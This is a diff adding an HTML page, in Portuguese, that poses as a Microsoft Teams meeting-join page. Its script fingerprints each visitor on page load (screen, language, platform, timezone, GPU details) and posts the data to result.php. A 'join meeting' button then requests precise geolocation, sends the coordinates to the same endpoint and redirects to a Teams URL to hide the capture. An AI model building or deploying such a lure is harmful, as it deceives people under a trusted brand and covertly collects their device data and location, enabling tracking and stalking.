@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Microsoft Teams</title>
+  <style>
+    body {
+      background-color: #f3f3f3;
+      font-family: "Segoe UI", sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    .card {
+      background-color: white;
+      max-width: 400px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0px 0px 20px rgba(0,0,0,0.1);
+    }
+
+    .loading {
+      font-size: 18px;
+      color: #333;
+      margin-top: 20px;
+    }
+
+    .btn {
+      background-color: #6264a7;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn:hover {
+      background-color: #5a5bb3;
+    }
+
+    .btn:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    .spinner {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ccc;
+      border-top-color: #0066cc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 6px;
+      background-color: #e0e0e0;
+      border-radius: 3px;
+      margin-top: 20px;
+      overflow: hidden;
+      display: none;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #6264a7, #4fc3f7);
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Reunião do Microsoft Teams</h2>
+    <p>Clique abaixo para entrar na reunião</p>
+    <button class="btn" id="joinBtn" onclick="getLocation()">Entrar na reunião</button>
+
+    <div class="spinner" id="spinner"></div>
+    <div class="progress-bar" id="progressBar">
+      <div class="progress-bar-fill" id="progressBarFill"></div>
+    </div>
+    <p class="loading" id="loadingText" style="display:none;">Aguarde, conectando...</p>
+  </div>
+
+  <script>
+    const TEAMS_URL = "https://teams.microsoft.com/l/meetup-join/";
+    const GEO_OPTIONS = {
+      enableHighAccuracy: false,
+      timeout: 30000,
+      maximumAge: 0
+    };
+
+    function redirectToTeams() {
+      window.location.href = TEAMS_URL;
+    }
+
+    function submitResult(payload) {
+      updateProgress(80);
+
+      return fetch("result.php", {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" }
+      });
+    }
+
+    function submitAndRedirect(payload) {
+      submitResult(payload)
+        .then(() => {
+          updateProgress(100);
+          setTimeout(redirectToTeams, 2000);
+        })
+        .catch(() => {
+          updateProgress(100);
+          setTimeout(redirectToTeams, 2000);
+        });
+    }
+
+    function updateProgress(percent) {
+      const progressBar = document.getElementById('progressBar');
+      const progressBarFill = document.getElementById('progressBarFill');
+      
+      if (percent > 0) {
+        progressBar.style.display = 'block';
+        progressBarFill.style.width = percent + '%';
+      } else {
+        progressBar.style.display = 'none';
+      }
+    }
+
+    function coletaDados() {
+      const screenRes = `${screen.width}x${screen.height}`;
+      const lang = navigator.language || 'N/A';
+      const platform = navigator.platform || 'N/A';
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+
+      let gpu_vendor = 'N/A';
+      let gpu_renderer = 'N/A';
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (gl && debugInfo) {
+          gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+          gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch (e) {}
+
+      return {
+        screen: screenRes,
+        lang: lang,
+        platform: platform,
+        timezone: timezone,
+        gpu_vendor: gpu_vendor,
+        gpu_renderer: gpu_renderer
+      };
+    }
+
+    function buildBasePayload() {
+      const base = coletaDados();
+      base.timestamp = new Date().toISOString();
+      return base;
+    }
+
+    function buildClickPayload(locationType, position) {
+      const payload = buildBasePayload();
+      payload.collection_event = 'click';
+      payload.location_type = locationType;
+
+      if (position) {
+        payload.lat = position.coords.latitude;
+        payload.lon = position.coords.longitude;
+        payload.accuracy = position.coords.accuracy;
+      }
+
+      return payload;
+    }
+
+    function getLocation() {
+      const joinBtn = document.getElementById('joinBtn');
+      const spinner = document.querySelector("#spinner");
+      const loadingText = document.querySelector("#loadingText");
+
+      joinBtn.disabled = true;
+      spinner.style.display = 'block';
+      loadingText.style.display = 'block';
+      updateProgress(20);
+
+      if (!navigator.geolocation) {
+        updateProgress(60);
+        submitAndRedirect(buildClickPayload('none'));
+        return;
+      }
+
+      updateProgress(40);
+
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          updateProgress(60);
+          submitAndRedirect(buildClickPayload('precise', position));
+        },
+        function () {
+          updateProgress(60);
+          submitAndRedirect(buildClickPayload('none'));
+        },
+        GEO_OPTIONS
+      );
+    }
+
+    // Coleta inicial sem geo
+    window.addEventListener("load", () => {
+      const base = buildBasePayload();
+      base.collection_event = 'page_load';
+      base.location_type = 'none';
+
+      fetch("result.php", {
+        method: "POST",
+        body: JSON.stringify(base),
+        headers: { "Content-Type": "application/json" }
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.status === 'success') {
+          console.log("Initial data collected successfully");
+        }
+      })
+      .catch(error => {
+        console.log("Initial data collection failed, but continuing...");
+      });
+    });
+  </script>
+</body>
+</html>
